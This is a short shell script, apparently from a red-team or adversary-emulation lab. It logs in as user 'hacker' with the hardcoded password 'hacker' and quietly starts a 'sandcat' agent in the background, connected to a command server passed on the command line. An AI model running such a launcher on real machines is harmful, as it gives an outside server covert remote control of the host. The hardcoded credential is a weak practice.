#!/bin/sh
su hacker <<!
hacker
nohup ./sandcat.go-linux -server $1 -group red 1>/dev/null 2>/dev/null &
!
